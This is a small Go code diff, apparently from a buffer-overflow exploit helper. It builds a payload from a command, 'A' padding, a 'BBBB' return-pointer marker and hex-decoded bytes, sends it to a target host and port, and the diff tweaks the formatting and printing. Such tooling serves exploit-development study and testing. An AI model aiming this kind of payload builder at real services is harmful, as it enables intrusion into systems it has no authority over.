@@ -143,10 +143,10 @@ OUTER:
 	}
 	decoded, _ := hex.DecodeString(badstring)
 	fmt.Println("Bytearray size:", len(decoded))
-	fmt.Println(badstring)
-	fmt.Println(string(decoded))
+
 	//Assemble and send payload
-	payload := fmt.Sprintf(c.Cmd + strings.Repeat("A", o) + "BBBB" + string(decoded))
+	payload := fmt.Sprint(c.Cmd + strings.Repeat("A", o) + "BBBB" + string(decoded))
+	fmt.Println(payload)
 	fmt.Printf("Sending payload to %s:%d with command: %s..."+"\n", c.Host, c.Port, c.Cmd)
 	err := sendPayload(c, payload)
 	if err != nil {
